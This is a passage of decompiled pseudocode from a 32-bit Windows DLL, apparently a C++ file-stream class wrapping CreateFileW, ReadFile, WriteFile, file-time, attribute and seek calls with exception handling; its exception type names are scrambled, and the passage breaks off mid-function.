_DWORD *__thiscall sub_100118E8(_DWORD *Block, char a2)
{
  sub_1001153A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10011907) --------------------------------------------------------
_DWORD *__thiscall sub_10011907(_DWORD *Block, char a2)
{
  sub_1001172E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001193B) --------------------------------------------------------
_DWORD *__stdcall sub_1001193B(_DWORD *a1, int a2, volatile LONG *lpAddend, int a4, int a5)
{
  int v5; // ecx
  volatile LONG *v7; // [esp-4h] [ebp-20h]

  v5 = a2;
  v7 = lpAddend;
  a1[1] = lpAddend;
  *a1 = v5;
  InterlockedIncrement(v7);
  a1[2] = a4;
  a1[3] = a5;
  sub_100016CE(&a2);
  return a1;
}

//----- (100119A2) --------------------------------------------------------
_DWORD *__userpurge sub_100119A2@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10011A0F) --------------------------------------------------------
_DWORD *__userpurge sub_10011A0F@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10011A4E) --------------------------------------------------------
void __thiscall sub_10011A4E(void *this)
{
  sub_10011AB5((int)this);
}

//----- (10011AB5) --------------------------------------------------------
void __usercall sub_10011AB5(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10011AFB) --------------------------------------------------------
_DWORD *__userpurge sub_10011AFB@<eax>(
        int a1@<ebx>,
        int a2@<edi>,
        _DWORD *a3,
        int a4,
        int a5,
        int a6,
        int a7,
        volatile LONG *lpAddend)
{
  volatile LONG *v8; // eax
  int v9; // ecx

  a3[1] = -1;
  *a3 = &off_10093BB8;
  sub_1000CE26(a3 + 2, a4);
  v8 = lpAddend;
  v9 = a7;
  a3[4] = a2;
  a3[6] = v8;
  a3[5] = v9;
  InterlockedIncrement(v8);
  a3[7] = a5;
  if ( a1 == -1 )
    a3[8] = 3;
  else
    a3[8] = a1;
  if ( a6 != -1 )
  {
    a3[9] = a6;
    goto LABEL_15;
  }
  switch ( a2 )
  {
    case -2147483648:
    case -2147483392:
      goto LABEL_13;
    case -1073741824:
      a3[9] = 4;
      break;
    case 0:
    case 256:
LABEL_13:
      a3[9] = 3;
      break;
    case 1073741824:
      a3[9] = 2;
      break;
  }
LABEL_15:
  sub_100015D8(&a7);
  return a3;
}
// 10093BB8: using guessed type int (__thiscall *off_10093BB8)(void *Block, char);

//----- (10011BBC) --------------------------------------------------------
void *__thiscall sub_10011BBC(void *Block, char a2)
{
  sub_10011C44((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10011BDB) --------------------------------------------------------
_DWORD *__userpurge sub_10011BDB@<eax>(_DWORD *a1@<edi>, _DWORD *a2)
{
  volatile LONG *v3; // [esp-4h] [ebp-20h]

  a2[1] = -1;
  *a2 = &off_10093BB8;
  sub_1000CE26(a2 + 2, (int)(a1 + 2));
  a2[4] = a1[4];
  a2[6] = a1[6];
  v3 = (volatile LONG *)a2[6];
  a2[5] = a1[5];
  InterlockedIncrement(v3);
  a2[7] = a1[7];
  a2[8] = a1[8];
  a2[9] = a1[9];
  return a2;
}
// 10093BB8: using guessed type int (__thiscall *off_10093BB8)(void *Block, char);

//----- (10011C44) --------------------------------------------------------
LONG __thiscall sub_10011C44(int this)
{
  *(_DWORD *)this = &off_10093BB8;
  if ( *(_DWORD *)(this + 4) != -1 )
    sub_10011E19((HANDLE *)this);
  sub_100015D8((void *)(this + 20));
  return sub_1000CE59((int *)(this + 8));
}
// 10093BB8: using guessed type int (__thiscall *off_10093BB8)(void *Block, char);

//----- (10011CA3) --------------------------------------------------------
char __thiscall sub_10011CA3(_DWORD *this)
{
  HANDLE FileW; // eax
  bool v3; // bl
  DWORD v4; // eax
  _DWORD v6[4]; // [esp+10h] [ebp-40h] BYREF
  _DWORD v7[4]; // [esp+20h] [ebp-30h] BYREF
  _DWORD pExceptionObject[7]; // [esp+30h] [ebp-20h] BYREF

  LOBYTE(FileW) = (*(int (__thiscall **)(_DWORD *))(*this + 12))(this);
  if ( !(_BYTE)FileW )
  {
    v3 = sub_10020CD2((int)(this + 2));
    FileW = CreateFileW(
              *(LPCWSTR *)(this[3] + 12),
              this[4],
              this[8],
              *(LPSECURITY_ATTRIBUTES *)(this[5] + 4),
              this[9],
              this[7],
              0);
    if ( FileW == (HANDLE)-1 )
    {
      v4 = GetLastError() - 2;
      if ( v4 )
      {
        if ( v4 != 78 )
        {
          sub_10027B8C(pExceptionObject, 1);
          _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
        }
        sub_10027CD4(v7);
        _CxxThrowException(v7, (_ThrowInfo *)&_TI5_AVBjzgFbjdoadXvizrkOkabjzgfb_jhzi_sr__);
      }
      sub_10027C51(v6);
      _CxxThrowException(v6, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
    }
    this[1] = FileW;
    if ( !v3 )
    {
      LOBYTE(FileW) = sub_10015FF9();
      if ( (_BYTE)FileW == 1 )
        LOBYTE(FileW) = sub_10021BA7((int)(this + 2));
    }
  }
  return (char)FileW;
}
// 10096F40: using guessed type __TI_flags _TI5_AVBjzgFbjdoadXvizrkOkabjzgfb_jhzi_sr__;
// 10011CA3: using guessed type _DWORD pExceptionObject[7];
// 10011CA3: using guessed type _DWORD var_30[4];
// 10011CA3: using guessed type _DWORD var_40[4];

//----- (10011D6E) --------------------------------------------------------
void __thiscall sub_10011D6E(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 3;
  sub_10027D2B(this + 3);
  sub_1001646C(v1);
}

//----- (10011D81) --------------------------------------------------------
_DWORD *__thiscall sub_10011D81(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10093B78;
    this[2] = &unk_10093B80;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_10016406(this + 3, v4);
  }
  sub_10010A0E(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10093B70;
  return this;
}
// 10093B70: using guessed type int (__stdcall *off_10093B70)(char);

//----- (10011DF7) --------------------------------------------------------
char *__thiscall sub_10011DF7(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 3);
  sub_10011D6E(this - 3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (10011E19) --------------------------------------------------------
int __thiscall sub_10011E19(HANDLE *this)
{
  int result; // eax
  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-10h] BYREF

  result = (*((int (__thiscall **)(HANDLE *))*this + 3))(this);
  if ( (_BYTE)result )
  {
    result = CloseHandle(this[1]);
    if ( !result )
    {
      sub_10027B8C(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
    this[1] = (HANDLE)-1;
  }
  return result;
}
// 10011E19: using guessed type _DWORD pExceptionObject[4];

//----- (10011E59) --------------------------------------------------------
BOOL __thiscall sub_10011E59(_DWORD *this)
{
  return this[1] != -1;
}

//----- (10011E63) --------------------------------------------------------
int __thiscall sub_10011E63(_DWORD *this)
{
  return this[1];
}

//----- (10011E67) --------------------------------------------------------
char *__thiscall sub_10011E67(char *this)
{
  return this + 8;
}

//----- (10011E6B) --------------------------------------------------------
int *__thiscall sub_10011E6B(_DWORD *this, int *a2)
{
  DWORD FullPathNameW; // eax
  const WCHAR *v4; // edi
  WCHAR *v5; // eax
  DWORD v6; // edi
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-2Ch] BYREF
  LPWSTR FilePart; // [esp+20h] [ebp-1Ch] BYREF
  int v10; // [esp+24h] [ebp-18h]
  DWORD nBufferLength; // [esp+28h] [ebp-14h] BYREF
  WCHAR Buffer[6]; // [esp+2Ch] [ebp-10h] BYREF
  int v13; // [esp+38h] [ebp-4h]

  v13 = 0;
  v10 = 0;
  FullPathNameW = GetFullPathNameW(*(LPCWSTR *)(this[3] + 12), 0, Buffer, &FilePart);
  nBufferLength = FullPathNameW;
  if ( !FullPathNameW
    || (sub_1000CC90(FullPathNameW + 2, a2),
        v13 = 0,
        v4 = *(const WCHAR **)(this[3] + 12),
        v10 = 1,
        v5 = (WCHAR *)sub_1000D0D9(a2),
        v6 = GetFullPathNameW(v4, nBufferLength, v5, &FilePart),
        sub_1000D118((int)a2),
        !v6) )
  {
    sub_10027B8C(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
  }
  if ( v6 > nBufferLength + 1 )
  {
    sub_10016441(&nBufferLength);
    _CxxThrowException(&nBufferLength, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return a2;
}
// 10011E6B: using guessed type WCHAR Buffer[6];
// 10011E6B: using guessed type _DWORD pExceptionObject[4];

//----- (10011F17) --------------------------------------------------------
int __thiscall sub_10011F17(_DWORD *this)
{
  return this[4];
}

//----- (10011F1B) --------------------------------------------------------
_DWORD *__thiscall sub_10011F1B(_DWORD *this, _DWORD *a2)
{
  volatile LONG *v3; // [esp-4h] [ebp-24h]

  a2[1] = this[6];
  v3 = (volatile LONG *)a2[1];
  *a2 = this[5];
  InterlockedIncrement(v3);
  return a2;
}

//----- (10011F57) --------------------------------------------------------
int __thiscall sub_10011F57(_DWORD *this)
{
  return this[7];
}

//----- (10011F5B) --------------------------------------------------------
int __thiscall sub_10011F5B(_DWORD *this)
{
  return this[8];
}

//----- (10011F5F) --------------------------------------------------------
int __thiscall sub_10011F5F(_DWORD *this)
{
  return this[9];
}

//----- (10011F63) --------------------------------------------------------
int __userpurge sub_10011F63@<eax>(
        HANDLE *a1@<esi>,
        FILETIME *lpCreationTime,
        FILETIME *lpLastAccessTime,
        FILETIME *lpLastWriteTime)
{
  char v4; // al
  bool v5; // bl
  int result; // eax
  int v7; // edi
  _DWORD pExceptionObject[5]; // [esp+8h] [ebp-14h] BYREF

  v4 = (*((int (__thiscall **)(HANDLE *))*a1 + 3))(a1);
  v5 = v4 == 0;
  if ( !v4 )
    (*((void (__thiscall **)(HANDLE *))*a1 + 1))(a1);
  result = SetFileTime(a1[1], lpCreationTime, lpLastAccessTime, lpLastWriteTime);
  v7 = result;
  if ( v5 )
    result = (*((int (__thiscall **)(HANDLE *))*a1 + 2))(a1);
  if ( !v7 )
  {
    sub_10027B8C(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
  }
  return result;
}
// 10011F63: using guessed type _DWORD pExceptionObject[5];

//----- (10011FC5) --------------------------------------------------------
_QWORD *__thiscall sub_10011FC5(HANDLE *this, _QWORD *a2, int a3)
{
  struct _FILETIME v3; // rax
  DWORD dwLowDateTime; // ecx
  _QWORD *result; // eax
  struct _FILETIME v6; // [esp+10h] [ebp-18h] BYREF
  struct _FILETIME v7; // [esp+18h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+20h] [ebp-8h] BYREF

  sub_10012362(&v8, &v6, this, &v7);
  v3 = sub_10012454(&v6, 1, a3);
  dwLowDateTime = v3.dwLowDateTime;
  result = a2;
  *a2 = __PAIR64__(v3.dwHighDateTime, dwLowDateTime);
  return result;
}

//----- (10012006) --------------------------------------------------------
int __thiscall sub_10012006(HANDLE *this, const FILETIME *a2, int a3)
{
  FILETIME v5; // [esp+10h] [ebp-20h] BYREF
  FILETIME v6; // [esp+18h] [ebp-18h] BYREF
  FILETIME v7; // [esp+20h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+28h] [ebp-8h] BYREF

  sub_10012362(&v7, &v8, this, &v6);
  v5 = sub_10012454(a2, a3, 1);
  return sub_10011F63(this, &v5, &v7, &v6);
}

//----- (10012058) --------------------------------------------------------
_QWORD *__thiscall sub_10012058(HANDLE *this, _QWORD *a2, int a3)
{
  struct _FILETIME v3; // rax
  DWORD dwLowDateTime; // ecx
  _QWORD *result; // eax
  struct _FILETIME v6; // [esp+10h] [ebp-18h] BYREF
  struct _FILETIME v7; // [esp+18h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+20h] [ebp-8h] BYREF

  sub_10012362(&v7, &v8, this, &v6);
  v3 = sub_10012454(&v6, 1, a3);
  dwLowDateTime = v3.dwLowDateTime;
  result = a2;
  *a2 = __PAIR64__(v3.dwHighDateTime, dwLowDateTime);
  return result;
}

//----- (1001209B) --------------------------------------------------------
int __thiscall sub_1001209B(HANDLE *this, const FILETIME *a2, int a3)
{
  FILETIME v5; // [esp+10h] [ebp-20h] BYREF
  FILETIME v6; // [esp+18h] [ebp-18h] BYREF
  FILETIME v7; // [esp+20h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+28h] [ebp-8h] BYREF

  sub_10012362(&v6, &v7, this, &v8);
  v5 = sub_10012454(a2, a3, 1);
  return sub_10011F63(this, &v7, &v6, &v5);
}

//----- (100120EB) --------------------------------------------------------
_QWORD *__thiscall sub_100120EB(HANDLE *this, _QWORD *a2, int a3)
{
  struct _FILETIME v3; // rax
  DWORD dwLowDateTime; // ecx
  _QWORD *result; // eax
  struct _FILETIME v6; // [esp+10h] [ebp-18h] BYREF
  struct _FILETIME v7; // [esp+18h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+20h] [ebp-8h] BYREF

  sub_10012362(&v6, &v8, this, &v7);
  v3 = sub_10012454(&v6, 1, a3);
  dwLowDateTime = v3.dwLowDateTime;
  result = a2;
  *a2 = __PAIR64__(v3.dwHighDateTime, dwLowDateTime);
  return result;
}

//----- (1001212C) --------------------------------------------------------
int __thiscall sub_1001212C(HANDLE *this, const FILETIME *a2, int a3)
{
  FILETIME v5; // [esp+10h] [ebp-20h] BYREF
  FILETIME v6; // [esp+18h] [ebp-18h] BYREF
  FILETIME v7; // [esp+20h] [ebp-10h] BYREF
  struct _FILETIME v8; // [esp+28h] [ebp-8h] BYREF

  sub_10012362(&v8, &v7, this, &v6);
  v5 = sub_10012454(a2, a3, 1);
  return sub_10011F63(this, &v7, &v5, &v6);
}

//----- (1001217E) --------------------------------------------------------
DWORD __thiscall sub_1001217E(HANDLE *this)
{
  int v2; // eax
  HANDLE FirstFileW; // eax
  DWORD dwFileAttributes; // esi
  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-29Ch] BYREF
  struct _BY_HANDLE_FILE_INFORMATION FileInformation; // [esp+14h] [ebp-28Ch] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+48h] [ebp-258h] BYREF

  if ( (*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    if ( !GetFileInformationByHandle(this[1], &FileInformation) )
    {
      sub_10027B8C(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
    dwFileAttributes = FileInformation.dwFileAttributes;
  }
  else
  {
    v2 = (*((int (__thiscall **)(HANDLE *))*this + 5))(this);
    FirstFileW = FindFirstFileW(*(LPCWSTR *)(*(_DWORD *)(v2 + 4) + 12), &FindFileData);
    if ( FirstFileW == (HANDLE)-1 )
    {
      sub_10027C51(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
    }
    dwFileAttributes = FindFileData.dwFileAttributes;
    if ( !FindClose(FirstFileW) )
    {
      sub_10027B8C(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
  }
  if ( dwFileAttributes == 128 )
    return 0;
  return dwFileAttributes;
}
// 1001217E: using guessed type _DWORD pExceptionObject[4];

//----- (1001224D) --------------------------------------------------------
BOOL __thiscall sub_1001224D(void *this, DWORD dwFileAttributes)
{
  int v2; // eax
  BOOL result; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 20))(this);
  result = SetFileAttributesW(*(LPCWSTR *)(*(_DWORD *)(v2 + 4) + 12), dwFileAttributes);
  if ( !result )
  {
    if ( GetLastError() == 2 )
    {
      sub_10027C51(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
    }
    sub_10027B8C(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
  }
  return result;
}
// 1001224D: using guessed type _DWORD pExceptionObject[4];

//----- (100122A1) --------------------------------------------------------
DWORD __thiscall sub_100122A1(HANDLE *this)
{
  int v2; // eax
  HANDLE FirstFileW; // eax
  DWORD FileSize; // esi
  _DWORD pExceptionObject[4]; // [esp+8h] [ebp-268h] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+18h] [ebp-258h] BYREF

  if ( (*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    FileSize = GetFileSize(this[1], 0);
    if ( FileSize == -1 )
    {
      sub_10027B8C(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
  }
  else
  {
    v2 = (*((int (__thiscall **)(HANDLE *))*this + 5))(this);
    FirstFileW = FindFirstFileW(*(LPCWSTR *)(*(_DWORD *)(v2 + 4) + 12), &FindFileData);
    if ( FirstFileW == (HANDLE)-1 )
    {
      sub_10027C51(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
    }
    FileSize = FindFileData.nFileSizeLow;
    if ( !FindClose(FirstFileW) )
    {
      sub_10027B8C(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
  }
  return FileSize;
}
// 100122A1: using guessed type _DWORD pExceptionObject[4];

//----- (10012362) --------------------------------------------------------
BOOL __userpurge sub_10012362@<eax>(
        struct _FILETIME *a1@<ebx>,
        struct _FILETIME *a2@<edi>,
        HANDLE *a3@<esi>,
        struct _FILETIME *a4)
{
  int v4; // eax
  HANDLE FirstFileW; // eax
  DWORD dwLowDateTime; // edx
  BOOL result; // eax
  _DWORD pExceptionObject[4]; // [esp+8h] [ebp-268h] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+18h] [ebp-258h] BYREF

  if ( (*((unsigned __int8 (__thiscall **)(HANDLE *))*a3 + 3))(a3) )
  {
    result = GetFileTime(a3[1], a2, a1, a4);
    if ( !result )
    {
      sub_10027B8C(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
  }
  else
  {
    v4 = (*((int (__thiscall **)(HANDLE *))*a3 + 5))(a3);
    FirstFileW = FindFirstFileW(*(LPCWSTR *)(*(_DWORD *)(v4 + 4) + 12), &FindFileData);
    if ( FirstFileW == (HANDLE)-1 )
    {
      sub_10027C51(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
    }
    dwLowDateTime = FindFileData.ftLastWriteTime.dwLowDateTime;
    *a2 = FindFileData.ftCreationTime;
    *a1 = FindFileData.ftLastAccessTime;
    a4->dwLowDateTime = dwLowDateTime;
    a4->dwHighDateTime = FindFileData.ftLastWriteTime.dwHighDateTime;
    result = FindClose(FirstFileW);
    if ( !result )
    {
      sub_10027B8C(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
  }
  return result;
}
// 10012362: using guessed type _DWORD pExceptionObject[4];

//----- (10012454) --------------------------------------------------------
struct _FILETIME __usercall sub_10012454@<edx:eax>(const FILETIME *a1@<eax>, int a2, int a3)
{
  BOOL v3; // eax
  bool v4; // cl
  DWORD dwLowDateTime; // edx
  DWORD dwHighDateTime; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-18h] BYREF
  struct _FILETIME LocalFileTime; // [esp+10h] [ebp-8h] BYREF

  if ( a2 == 1 )
  {
    if ( !a3 )
    {
      v3 = FileTimeToLocalFileTime(a1, &LocalFileTime);
LABEL_7:
      v4 = v3;
      goto LABEL_9;
    }
  }
  else if ( !a2 && a3 == 1 )
  {
    v3 = LocalFileTimeToFileTime(a1, &LocalFileTime);
    goto LABEL_7;
  }
  dwLowDateTime = a1->dwLowDateTime;
  dwHighDateTime = a1->dwHighDateTime;
  v4 = 1;
  LocalFileTime.dwLowDateTime = dwLowDateTime;
  LocalFileTime.dwHighDateTime = dwHighDateTime;
LABEL_9:
  if ( !v4 )
  {
    sub_10027B8C(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
  }
  return LocalFileTime;
}
// 10012454: using guessed type _DWORD pExceptionObject[4];

//----- (100124C3) --------------------------------------------------------
__int16 __thiscall sub_100124C3(void *this)
{
  __int16 v2; // si
  int v4[7]; // [esp+10h] [ebp-20h] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  sub_10016983((void *)1, (int)v4, 0);
  v5 = 0;
  if ( (*(int (__thiscall **)(void *, int *))(*(_DWORD *)this + 48))(this, v4) == 1 )
    v2 = *(unsigned __int8 *)sub_10016C51((int)v4, 0);
  else
    v2 = -1;
  v5 = -1;
  sub_10016B53(v4);
  return v2;
}
// 100124C3: using guessed type int var_20[7];

//----- (10012521) --------------------------------------------------------
DWORD __thiscall sub_10012521(HANDLE *this, _DWORD *NumberOfBytesRead)
{
  _DWORD *v2; // esi
  DWORD v3; // ebx
  unsigned __int8 (__thiscall **v5)(HANDLE *); // eax
  DWORD result; // eax
  int v7; // eax
  char v8; // bl
  void *v9; // eax
  BOOL File; // eax
  _DWORD pExceptionObject[4]; // [esp+Ch] [ebp-18h] BYREF
  DWORD nNumberOfBytesToRead; // [esp+1Ch] [ebp-8h]

  v2 = NumberOfBytesRead;
  v3 = NumberOfBytesRead[3];
  v5 = (unsigned __int8 (__thiscall **)(HANDLE *))*this;
  nNumberOfBytesToRead = v3;
  if ( !v5[3](this) )
  {
    sub_10027D57(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVCsszWkelsgXqduhacss_jhzi_sr__);
  }
  if ( !v3 )
    return 0;
  v7 = v2[1];
  NumberOfBytesRead = 0;
  v8 = *(_BYTE *)(v7 + 8);
  v9 = (void *)sub_10016C00(v2);
  File = ReadFile(this[1], v9, nNumberOfBytesToRead, (LPDWORD)&NumberOfBytesRead, 0);
  if ( v8 )
    *(_BYTE *)(v2[1] + 8) = 1;
  if ( !File )
  {
    sub_10027B8C(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
  }
  result = (DWORD)NumberOfBytesRead;
  if ( !NumberOfBytesRead )
    return -1;
  return result;
}
// 10012521: using guessed type _DWORD pExceptionObject[4];

//----- (100125B3) --------------------------------------------------------
void __thiscall sub_100125B3(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 3;
  sub_10027DAE(this + 3);
  sub_1001646C(v1);
}

//----- (100125C6) --------------------------------------------------------
_DWORD *__thiscall sub_100125C6(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10093B90;
    this[2] = &unk_10093B98;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_10016406(this + 3, v4);
  }
  sub_10010A0E(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10093B88;
  return this;
}
// 10093B88: using guessed type int (__stdcall *off_10093B88)(char);

//----- (1001263C) --------------------------------------------------------
char *__thiscall sub_1001263C(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 3);
  sub_100125B3(this - 3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1001265E) --------------------------------------------------------
LONG __thiscall sub_1001265E(void *this, char a2)
{
  int v4[7]; // [esp+10h] [ebp-20h] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  sub_10016983((void *)1, (int)v4, &a2);
  v5 = 0;
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 56))(this, v4);
  v5 = -1;
  return sub_10016B53(v4);
}
// 1001265E: using guessed type int var_20[7];

//----- (1001269F) --------------------------------------------------------
int __thiscall sub_1001269F(HANDLE *this, _DWORD *NumberOfBytesWritten)
{
  _DWORD *v2; // ebx
  DWORD v4; // edi
  int result; // eax
  const void *v6; // eax
  _DWORD pExceptionObject[4]; // [esp+Ch] [ebp-10h] BYREF

  v2 = NumberOfBytesWritten;
  v4 = NumberOfBytesWritten[3];
  result = (*((int (__thiscall **)(HANDLE *))*this + 3))(this);
  if ( !(_BYTE)result )
  {
    sub_10027D57(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVCsszWkelsgXqduhacss_jhzi_sr__);
  }
  if ( v4 )
  {
    NumberOfBytesWritten = 0;
    v6 = (const void *)sub_10016C24(v2);
    result = WriteFile(this[1], v6, v4, (LPDWORD)&NumberOfBytesWritten, 0);
    if ( !result || NumberOfBytesWritten != (_DWORD *)v4 )
    {
      sub_10027B8C(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVQdlyUQBeskfuooz_jhzi_sr__);
    }
  }
  return result;
}
// 1001269F: using guessed type _DWORD pExceptionObject[4];

//----- (10012712) --------------------------------------------------------
DWORD __thiscall sub_10012712(HANDLE *this, LONG lDistanceToMove, DWORD dwMoveMethod)
{
  DWORD result; // eax
  _ThrowInfo *v5; // [esp-4h] [ebp-18h]
  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-10h] BYREF

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    sub_10027D57(pExceptionObject);
    v5 = (_ThrowInfo *)&_TI5_AVCsszWkelsgXqduhacss_jhzi_sr__;
    goto LABEL_3;
  }
  result = SetFilePointer(this[1], lDistanceToMove, 0, dwMoveMethod);
  if ( result == -1 )
  {
    if ( GetLastError() == 131 )
      sub_10027E9A(pExceptionObject);
    else
      sub_10027B8C(pExceptionObject, 1);
LABEL_3:
    _CxxThrowException(pExceptionObject, v5);
  }
  return result;
}
// 10012736: variable 'v5' is possibly undefined
// 10012712: using guessed type _DWORD pExceptionObject[4];

//----- (10012782) --------------------------------------------------------
void __thiscall sub_10012782(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 3;
  sub_10027EF1(this + 3);
  sub_1001646C(v1);
}

//----- (10012795) --------------------------------------------------------
_DWORD *__thiscall sub_10012795(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10093BA8;
    this[2] = &unk_10093BB0;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_10016406(this + 3, v4);
  }
  sub_10010A0E(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10093BA0;
  return this;
}
// 10093BA0: using guessed type int (__stdcall *off_10093BA0)(char);

//----- (1001280B) --------------------------------------------------------
char *__thiscall sub_1001280B(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 3);
  sub_10012782(this - 3);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1001282D) --------------------------------------------------------
DWORD __thiscall sub_1001282D(HANDLE *this)
{
  DWORD result; // eax
  _ThrowInfo *v3; // [esp-4h] [ebp-18h]
  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-10h] BYREF

  if ( !(*((unsigned __int8 (__thiscall **)(HANDLE *))*this + 3))(this) )
  {
    sub_10027D57(pExceptionObject);
    v3 = (_ThrowInfo *)&_TI5_AVCsszWkelsgXqduhacss_jhzi_sr__;
    goto LABEL_3;
  }
  result = SetFilePointer(this[1], 0, 0, 1u);
  if ( result == -1 )
  {
    sub_10027B8C(pExceptionObject, 1);
LABEL_3:
    _CxxThrowException(pExceptionObject, v3);
  }
  return result;
}
// 10012851: variable 'v3' is possibly undefined
// 1001282D: using guessed type _DWORD pExceptionObject[4];

//----- (1001287F) --------------------------------------------------------
BOOL __thiscall sub_1001287F(HANDLE *this)
{
  BOOL result; // eax
  _ThrowInfo *v3; // [esp-4h] [ebp-18h]
